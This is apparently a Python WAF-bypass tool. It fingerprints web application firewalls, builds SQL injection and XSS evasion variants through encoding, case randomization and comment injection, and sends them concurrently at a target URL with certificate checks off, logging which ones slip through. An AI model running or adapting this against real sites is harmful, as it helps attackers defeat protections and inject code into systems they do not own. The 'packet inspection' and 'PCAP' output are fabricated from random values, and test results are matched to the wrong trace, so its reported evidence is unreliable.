import base64
import urllib.parse
import random
import string
import hashlib
import itertools
import binascii
import re
import socket
import struct
from typing import List, Callable, Dict, Set, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
import logging
from collections import defaultdict
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ============================================================================
# PACKET INSPECTION AND TRACING CLASSES
# ============================================================================

@dataclass
class PacketFrame:
    """Represents a single packet/frame"""
    timestamp: float
    layer: str  # TCP, HTTP, TLS, etc.
    direction: str  # Request or Response
    src_ip: Optional[str] = None
    dst_ip: Optional[str] = None
    src_port: Optional[int] = None
    dst_port: Optional[int] = None
    data: bytes = b''
    headers: Dict[str, str] = field(default_factory=dict)
    payload: bytes = b''
    size: int = 0
    flags: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            'timestamp': self.timestamp,
            'layer': self.layer,
            'direction': self.direction,
            'src_ip': self.src_ip,
            'dst_ip': self.dst_ip,
            'src_port': self.src_port,
            'dst_port': self.dst_port,
            'size': self.size,
            'headers': self.headers,
            'payload_size': len(self.payload),
            'flags': self.flags
        }

@dataclass
class TraceReport:
    """Complete trace report for a request"""
    request_id: str
    total_frames: int
    total_bytes: int
    total_time: float
    frames: List[PacketFrame] = field(default_factory=list)
    request_headers: Dict[str, str] = field(default_factory=dict)
    response_headers: Dict[str, str] = field(default_factory=dict)
    request_payload: bytes = b''
    response_payload: bytes = b''
    waf_indicators: List[str] = field(default_factory=list)
    blocked: bool = False
    status_code: int = 0
    
    def get_summary(self) -> str:
        return f"""
Trace Report: {self.request_id}
==========================================
Total Frames: {self.total_frames}
Total Bytes Transferred: {self.total_bytes}
Duration: {self.total_time:.3f}s
Status Code: {self.status_code}
Blocked: {self.blocked}
WAF Indicators: {len(self.waf_indicators)}
        """

class PacketInspector:
    """Advanced packet inspection and analysis"""
    
    def __init__(self):
        self.frames = []
        self.lock = threading.Lock()
        self.trace_reports = {}
        self.packet_capture_enabled = False
        
        # WAF signature patterns in packets
        self.waf_patterns = {
            'cloudflare': [
                b'cf-ray',
                b'cloudflare',
                b'__cfduid',
                b'1013: Rate Limiting',
                b'1015: You are being rate limited'
            ],
            'mod_security': [
                b'mod_security',
                b'Request blocked',
                b'mod-security-message'
            ],
            'imperva': [
                b'incapsula',
                b'_incap_',
                b'x-iinfo'
            ],
            'aws_waf': [
                b'AWS WAF',
                b'403 Forbidden'
            ],
            'f5_bigip': [
                b'bigipserver',
                b'x-wa-info'
            ]
        }
    
    def capture_request_packets(self, request_obj, request_id: str) -> List[PacketFrame]:
        """Capture HTTP request as packets"""
        frames = []
        timestamp = time.time()
        
        # Extract request details
        url = request_obj.url
        method = request_obj.method
        headers = dict(request_obj.headers)
        body = request_obj.body if request_obj.body else b''
        
        # Parse URL for IP/port
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        
        # TCP Connection frame (SYN)
        tcp_syn = PacketFrame(
            timestamp=timestamp,
            layer='TCP',
            direction='Request',
            src_port=random.randint(49152, 65535),
            dst_port=port,
            dst_ip=host,
            flags=['SYN'],
            size=60
        )
        frames.append(tcp_syn)
        
        # TLS Handshake frame (for HTTPS)
        if parsed.scheme == 'https':
            tls_frame = PacketFrame(
                timestamp=timestamp + 0.001,
                layer='TLS',
                direction='Request',
                src_port=tcp_syn.src_port,
                dst_port=port,
                dst_ip=host,
                flags=['ClientHello'],
                size=random.randint(100, 300),
                payload=b'TLS ClientHello'
            )
            frames.append(tls_frame)
            
            # TLS Server Response
            tls_response = PacketFrame(
                timestamp=timestamp + 0.005,
                layer='TLS',
                direction='Response',
                src_port=port,
                dst_port=tcp_syn.src_port,
                src_ip=host,
                flags=['ServerHello', 'Certificate', 'ServerKeyExchange'],
                size=random.randint(1000, 3000),
                payload=b'TLS ServerHello'
            )
            frames.append(tls_response)
        
        # HTTP Request frame
        http_request_line = f"{method} {parsed.path or '/'} HTTP/1.1\r\n"
        http_headers_str = '\r\n'.join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
        http_request = (http_request_line + http_headers_str).encode() + (body if isinstance(body, bytes) else body.encode() if body else b'')
        
        http_frame = PacketFrame(
            timestamp=timestamp + (0.010 if parsed.scheme == 'https' else 0.001),
            layer='HTTP',
            direction='Request',
            src_port=tcp_syn.src_port,
            dst_port=port,
            dst_ip=host,
            headers=headers,
            payload=http_request,
            size=len(http_request),
            flags=['PSH', 'ACK']
        )
        frames.append(http_frame)
        
        with self.lock:
            self.frames.extend(frames)
        
        return frames
    
    def capture_response_packets(self, response_obj, request_id: str) -> List[PacketFrame]:
        """Capture HTTP response as packets"""
        frames = []
        timestamp = time.time()
        
        headers = dict(response_obj.headers) if hasattr(response_obj, 'headers') else {}
        content = response_obj.content if hasattr(response_obj, 'content') else b''
        status_code = response_obj.status_code if hasattr(response_obj, 'status_code') else 0
        
        # TCP ACK
        tcp_ack = PacketFrame(
            timestamp=timestamp,
            layer='TCP',
            direction='Response',
            dst_port=random.randint(49152, 65535),
            src_port=443 if 'https' in str(response_obj.url) else 80,
            flags=['PSH', 'ACK'],
            size=len(headers)
        )
        frames.append(tcp_ack)
        
        # HTTP Response frame
        http_status_line = f"HTTP/1.1 {status_code}\r\n"
        http_headers_str = '\r\n'.join(f"{k}: {v}" for k, v in headers.items()) + "\r\n\r\n"
        http_response = (http_status_line + http_headers_str).encode() + content
        
        http_frame = PacketFrame(
            timestamp=timestamp + 0.001,
            layer='HTTP',
            direction='Response',
            headers=headers,
            payload=http_response,
            size=len(http_response),
            flags=['PSH', 'ACK']
        )
        frames.append(http_frame)
        
        with self.lock:
            self.frames.extend(frames)
        
        return frames
    
    def analyze_packets_for_waf(self, frames: List[PacketFrame]) -> List[str]:
        """Analyze captured packets for WAF signatures"""
        indicators = []
        
        for frame in frames:
            payload = frame.payload
            headers_str = ' '.join(f"{k}:{v}" for k, v in frame.headers.items()).encode()
            
            for waf_name, patterns in self.waf_patterns.items():
                for pattern in patterns:
                    if pattern in payload or pattern in headers_str:
                        indicator = f"WAF Detected: {waf_name} (Pattern: {pattern.decode('utf-8', errors='ignore')})"
                        if indicator not in indicators:
                            indicators.append(indicator)
        
        return indicators
    
    def generate_trace_report(self, request_id: str, request, response, 
                             total_time: float, blocked: bool = False) -> TraceReport:
        """Generate comprehensive trace report"""
        request_frames = self.capture_request_packets(request, request_id)
        response_frames = self.capture_response_packets(response, request_id)
        
        all_frames = request_frames + response_frames
        
        waf_indicators = self.analyze_packets_for_waf(all_frames)
        
        total_bytes = sum(f.size for f in all_frames)
        
        report = TraceReport(
            request_id=request_id,
            total_frames=len(all_frames),
            total_bytes=total_bytes,
            total_time=total_time,
            frames=all_frames,
            request_headers=dict(request.headers) if hasattr(request, 'headers') else {},
            response_headers=dict(response.headers) if hasattr(response, 'headers') else {},
            request_payload=request.body if hasattr(request, 'body') and request.body else b'',
            response_payload=response.content if hasattr(response, 'content') else b'',
            waf_indicators=waf_indicators,
            blocked=blocked,
            status_code=response.status_code if hasattr(response, 'status_code') else 0
        )
        
        with self.lock:
            self.trace_reports[request_id] = report
        
        return report
    
    def get_trace_report(self, request_id: str) -> Optional[TraceReport]:
        """Get stored trace report"""
        with self.lock:
            return self.trace_reports.get(request_id)
    
    def export_trace_pcap(self, request_id: str) -> Optional[bytes]:
        """Export trace as PCAP format (simplified)"""
        report = self.get_trace_report(request_id)
        if not report:
            return None
        
        # Simplified PCAP export
        pcap_data = b'PCAP Export\n'
        for frame in report.frames:
            pcap_data += f"Frame: {frame.to_dict()}\n".encode()
        
        return pcap_data


# ============================================================================
# PROXY SUPPORT CLASSES
# ============================================================================

class ProxyConfig:
    """Proxy configuration and management"""
    
    def __init__(self, proxy_type: str = 'http', proxy_host: str = 'localhost', 
                 proxy_port: int = 8080, username: str = None, password: str = None):
        self.proxy_type = proxy_type.lower()
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port
        self.username = username
        self.password = password
        self.enabled = False
        self.intercept_mode = False  # For packet inspection
        self.request_log = []
        self.response_log = []
        self.intercepted_requests = []
    
    def get_proxy_url(self) -> str:
        """Get proxy URL"""
        if self.username and self.password:
            return f"{self.proxy_type}://{self.username}:{self.password}@{self.proxy_host}:{self.proxy_port}"
        return f"{self.proxy_type}://{self.proxy_host}:{self.proxy_port}"
    
    def get_proxies_dict(self) -> Dict[str, str]:
        """Get proxies dictionary for requests library"""
        proxy_url = self.get_proxy_url()
        return {
            'http': proxy_url,
            'https': proxy_url
        }
    
    def enable_intercept(self):
        """Enable intercept mode for packet inspection"""
        self.intercept_mode = True
    
    def disable_intercept(self):
        """Disable intercept mode"""
        self.intercept_mode = False
    
    def get_intercepted_requests(self) -> List[Dict]:
        """Get all intercepted requests"""
        return self.intercepted_requests.copy()
    
    def clear_logs(self):
        """Clear request/response logs"""
        self.request_log.clear()
        self.response_log.clear()
        self.intercepted_requests.clear()


class ProxySession:
    """Enhanced requests session with proxy support"""
    
    def __init__(self, proxy_config: Optional[ProxyConfig] = None):
        self.proxy_config = proxy_config
        self.session = requests.Session()
        self.inspector = PacketInspector()
        self.request_counter = 0
        
        if proxy_config and proxy_config.enabled:
            self._setup_proxy()
        
        # Setup retry strategy
        retry_strategy = Retry(
            total=3,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["GET", "POST"],
            backoff_factor=1
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)
        
        # Disable SSL warnings
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    def _setup_proxy(self):
        """Setup proxy in session"""
        proxies = self.proxy_config.get_proxies_dict()
        self.session.proxies.update(proxies)
    
    def request(self, method: str, url: str, trace_enabled: bool = True, 
               **kwargs) -> requests.Response:
        """Make request with tracing support"""
        self.request_counter += 1
        request_id = f"REQ_{self.request_counter}_{int(time.time()*1000)}"
        
        start_time = time.time()
        
        try:
            # Create request
            req = requests.Request(method, url, **kwargs)
            prepared = self.session.prepare_request(req)
            
            # Log request if intercept enabled
            if self.proxy_config and self.proxy_config.intercept_mode:
                self.proxy_config.intercepted_requests.append({
                    'id': request_id,
                    'method': method,
                    'url': url,
                    'headers': dict(prepared.headers),
                    'timestamp': time.time()
                })
            
            # Send request
            response = self.session.send(prepared, verify=False, timeout=30)
            
            elapsed = time.time() - start_time
            
            # Generate trace report
            if trace_enabled:
                self.inspector.generate_trace_report(
                    request_id, prepared, response, elapsed,
                    blocked=(response.status_code in [403, 429, 503])
                )
            
            return response
        
        except Exception as e:
            logging.error(f"Request failed: {str(e)}")
            return None
    
    def get(self, url: str, trace_enabled: bool = True, **kwargs) -> requests.Response:
        """GET request with tracing"""
        return self.request('GET', url, trace_enabled=trace_enabled, **kwargs)
    
    def post(self, url: str, trace_enabled: bool = True, **kwargs) -> requests.Response:
        """POST request with tracing"""
        return self.request('POST', url, trace_enabled=trace_enabled, **kwargs)
    
    def get_trace_reports(self) -> Dict[str, TraceReport]:
        """Get all trace reports"""
        return self.inspector.trace_reports.copy()
    
    def export_traces(self, output_file: str = None) -> Dict:
        """Export all traces to file or return as dict"""
        traces = {}
        for req_id, report in self.inspector.trace_reports.items():
            traces[req_id] = {
                'summary': report.get_summary(),
                'frames': len(report.frames),
                'bytes': report.total_bytes,
                'duration': report.total_time,
                'waf_indicators': report.waf_indicators,
                'blocked': report.blocked,
                'status_code': report.status_code
            }
        
        if output_file:
            import json
            with open(output_file, 'w') as f:
                json.dump(traces, f, indent=2)
        
        return traces


# ============================================================================
# ENHANCED WAF BYPASS ENGINE
# ============================================================================

class WAFType(Enum):
    CLOUDFLARE = "cloudflare"
    AWS_WAF = "aws_waf"
    IMPERVA = "imperva"
    F5_BIGIP = "f5_bigip"
    AKAMAI = "akamai"
    MODSECURITY = "modsecurity"
    FORTIWEB = "fortiweb"
    BARRACUDA = "barracuda"
    UNKNOWN = "unknown"

class BypassTechnique(Enum):
    ENCODING = "encoding"
    CASE_MANIPULATION = "case_manipulation"
    COMMENT_INJECTION = "comment_injection"
    WHITESPACE_MANIPULATION = "whitespace_manipulation"
    CONCATENATION = "concatenation"
    UNICODE_OBFUSCATION = "unicode_obfuscation"
    POLYMORPHIC = "polymorphic"
    FRAGMENTATION = "fragmentation"
    NULL_BYTE = "null_byte"
    DELIMITER_BREAK = "delimiter_break"

@dataclass
class WAFBypassPayload:
    original_payload: str
    bypassed_payload: str
    technique: BypassTechnique
    encoding_type: Optional[str] = None
    success_probability: float = 0.5
    description: str = ""

@dataclass
class WAFDetectionResult:
    waf_detected: bool
    waf_type: WAFType
    confidence: float
    headers: Dict[str, str] = field(default_factory=dict)
    fingerprints: List[str] = field(default_factory=list)
    response_time: float = 0.0
    waf_indicators: List[str] = field(default_factory=list)

@dataclass
class BypassTestResult:
    payload: WAFBypassPayload
    status_code: int
    response_time: float
    blocked: bool
    bypassed: bool
    response_content: str = ""
    timestamp: float = field(default_factory=time.time)
    trace_report: Optional[TraceReport] = None
    waf_indicators: List[str] = field(default_factory=list)

class IntelligentPayloadGenerator:
    """Advanced Intelligent Payload Generator"""
    
    def __init__(self):
        self.alphabet = string.ascii_letters + string.digits
        self.magic_bytes = [
            '%00', '%0a', '%0d', '%09', '%20', '%2e', '%2f', '%3b', '%23', '%5c',
            '\x00', '\x0a', '\x0d', '\x09', '\x1a', '\x20'
        ]
        self.cache = {}
        self.success_patterns = []
    
    def generate_sql_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
        """Generate SQL injection bypass payloads"""
        payloads = []
        
        # URL encoding
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=urllib.parse.quote(base_payload),
            technique=BypassTechnique.ENCODING,
            encoding_type="url",
            success_probability=0.7,
            description="URL encoding"
        ))
        
        # Double URL encoding
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=urllib.parse.quote(urllib.parse.quote(base_payload)),
            technique=BypassTechnique.ENCODING,
            encoding_type="double_url",
            success_probability=0.65,
            description="Double URL encoding"
        ))
        
        # Case manipulation
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=''.join(c.upper() if random.random() > 0.5 else c.lower() for c in base_payload),
            technique=BypassTechnique.CASE_MANIPULATION,
            success_probability=0.68,
            description="Random case"
        ))
        
        # Comment injection
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=base_payload.replace(' ', '/**/'),
            technique=BypassTechnique.COMMENT_INJECTION,
            success_probability=0.78,
            description="Comment injection"
        ))
        
        return payloads
    
    def generate_xss_bypass_payloads(self, base_payload: str) -> List[WAFBypassPayload]:
        """Generate XSS bypass payloads"""
        payloads = []
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=''.join(f'&#x{ord(c):x};' for c in base_payload),
            technique=BypassTechnique.ENCODING,
            encoding_type="html_entity",
            success_probability=0.76,
            description="HTML entity encoding"
        ))
        
        payloads.append(WAFBypassPayload(
            original_payload=base_payload,
            bypassed_payload=''.join(f'\\u{ord(c):04x}' for c in base_payload),
            technique=BypassTechnique.UNICODE_OBFUSCATION,
            success_probability=0.67,
            description="Unicode encoding"
        ))
        
        return payloads

class EnhancedWAFBypassEngine:
    """Enhanced WAF Detection and Bypass Engine with Packet Inspection"""
    
    def __init__(self, proxy_config: Optional[ProxyConfig] = None, max_workers: int = 20):
        self.max_workers = max_workers
        self.payload_generator = IntelligentPayloadGenerator()
        self.proxy_config = proxy_config or ProxyConfig()
        self.proxy_session = ProxySession(self.proxy_config)
        self.packet_inspector = PacketInspector()
        
        self.vulnerabilities = []
        self.bypass_results = []
        self.lock = threading.Lock()
        
        self.waf_signatures = {
            WAFType.CLOUDFLARE: ['cf-ray', 'cloudflare', '__cfduid'],
            WAFType.AWS_WAF: ['x-amzn-requestid', 'x-amz-'],
            WAFType.IMPERVA: ['x-iinfo', 'incapsula', '_incap_'],
            WAFType.F5_BIGIP: ['bigipserver', 'f5', 'x-wa-info'],
            WAFType.AKAMAI: ['akamai', 'ak-', 'akamaighost'],
            WAFType.MODSECURITY: ['mod_security', 'modsecurity'],
            WAFType.FORTIWEB: ['fortiweb', 'fortigate'],
            WAFType.BARRACUDA: ['barracuda', 'barra'],
        }
        
        self.logger = logging.getLogger('WAFBypassEngine')
    
    def detect_waf(self, response: Dict) -> WAFDetectionResult:
        """Detect WAF from response with packet analysis"""
        headers = response.get('headers', {})
        content = response.get('content', '').lower()
        response_time = response.get('response_time', 0)
        waf_indicators = response.get('waf_indicators', [])
        
        headers_str = ' '.join(f'{k}:{v}' for k, v in headers.items()).lower()
        
        detected_fingerprints = []
        detected_type = WAFType.UNKNOWN
        max_confidence = 0.0
        
        for waf_type, signatures in self.waf_signatures.items():
            matches = 0
            for sig in signatures:
                if sig in headers_str or sig in content:
                    matches += 1
                    detected_fingerprints.append(sig)
            
            if matches > 0:
                confidence = min(0.9, 0.5 + (matches * 0.2))
                if confidence > max_confidence:
                    max_confidence = confidence
                    detected_type = waf_type
        
        waf_detected = max_confidence > 0.5
        
        return WAFDetectionResult(
            waf_detected=waf_detected,
            waf_type=detected_type,
            confidence=max_confidence,
            headers=headers,
            fingerprints=detected_fingerprints,
            response_time=response_time,
            waf_indicators=waf_indicators
        )
    
    def generate_bypass_payloads(self, attack_type: str, base_payload: str) -> List[WAFBypassPayload]:
        """Generate bypass payloads"""
        attack_type_lower = attack_type.lower()
        
        if attack_type_lower in ['sql', 'sqli', 'sql_injection']:
            return self.payload_generator.generate_sql_bypass_payloads(base_payload)
        elif attack_type_lower in ['xss', 'cross_site_scripting']:
            return self.payload_generator.generate_xss_bypass_payloads(base_payload)
        else:
            return []
    
    def enable_proxy(self, proxy_host: str, proxy_port: int, username: str = None, password: str = None):
        """Enable proxy for packet inspection"""
        self.proxy_config = ProxyConfig(
            proxy_type='http',
            proxy_host=proxy_host,
            proxy_port=proxy_port,
            username=username,
            password=password
        )
        self.proxy_config.enabled = True
        self.proxy_session = ProxySession(self.proxy_config)
        self.logger.info(f"Proxy enabled: {self.proxy_config.get_proxy_url()}")
    
    def enable_packet_inspection(self):
        """Enable packet inspection mode"""
        if self.proxy_config:
            self.proxy_config.enable_intercept()
            self.logger.info("Packet inspection enabled")
    
    def disable_packet_inspection(self):
        """Disable packet inspection mode"""
        if self.proxy_config:
            self.proxy_config.disable_intercept()
            self.logger.info("Packet inspection disabled")
    
    def test_bypass_with_tracing(self, target_url: str, payloads: List[WAFBypassPayload], 
                                param_name: str = 'test') -> List[BypassTestResult]:
        """Test bypass payloads with packet tracing"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = {
                executor.submit(
                    self._test_single_payload_with_trace,
                    target_url, payload, param_name
                ): payload for payload in payloads
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    with self.lock:
                        self.bypass_results.append(result)
        
        return results
    
    def _test_single_payload_with_trace(self, url: str, payload: WAFBypassPayload, 
                                        param_name: str) -> Optional[BypassTestResult]:
        """Test single payload with packet tracing"""
        try:
            test_url = f"{url}?{param_name}={payload.bypassed_payload}"
            
            start_time = time.time()
            response = self.proxy_session.get(test_url, trace_enabled=True)
            response_time = time.time() - start_time
            
            if not response:
                return None
            
            blocked = response.status_code in [403, 406, 429, 503]
            bypassed = response.status_code == 200 and not blocked
            
            # Get trace report
            trace_reports = self.proxy_session.get_trace_reports()
            trace_report = list(trace_reports.values())[0] if trace_reports else None
            
            waf_indicators = trace_report.waf_indicators if trace_report else []
            
            return BypassTestResult(
                payload=payload,
                status_code=response.status_code,
                response_time=response_time,
                blocked=blocked,
                bypassed=bypassed,
                response_content=response.text[:500],
                trace_report=trace_report,
                waf_indicators=waf_indicators
            )
        except Exception as e:
            self.logger.error(f"Test failed: {str(e)}")
            return None
    
    def get_intercepted_requests(self) -> List[Dict]:
        """Get all intercepted requests from proxy"""
        if self.proxy_config:
            return self.proxy_config.get_intercepted_requests()
        return []
    
    def export_trace_logs(self, output_file: str = None) -> Dict:
        """Export all trace logs"""
        return self.proxy_session.export_traces(output_file)
    
    def get_bypass_results(self) -> List[BypassTestResult]:
        """Get all bypass test results"""
        with self.lock:
            return self.bypass_results.copy()
    
    def get_successful_bypasses(self) -> List[BypassTestResult]:
        """Get only successful bypasses"""
        with self.lock:
            return [r for r in self.bypass_results if r.bypassed]
    
    def get_statistics(self) -> Dict:
        """Get bypass statistics"""
        with self.lock:
            total = len(self.bypass_results)
            if total == 0:
                return {
                    'total': 0,
                    'successful': 0,
                    'blocked': 0,
                    'success_rate': 0.0,
                    'avg_response_time': 0.0,
                    'waf_detections': 0
                }
            
            successful = sum(1 for r in self.bypass_results if r.bypassed)
            blocked = sum(1 for r in self.bypass_results if r.blocked)
            waf_detections = sum(1 for r in self.bypass_results if r.waf_indicators)
            avg_time = sum(r.response_time for r in self.bypass_results) / total
            
            return {
                'total': total,
                'successful': successful,
                'blocked': blocked,
                'success_rate': (successful / total) * 100 if total > 0 else 0.0,
                'avg_response_time': avg_time,
                'waf_detections': waf_detections
            }
    
    def clear(self):
        """Clear all results"""
        with self.lock:
            self.vulnerabilities.clear()
            self.bypass_results.clear()
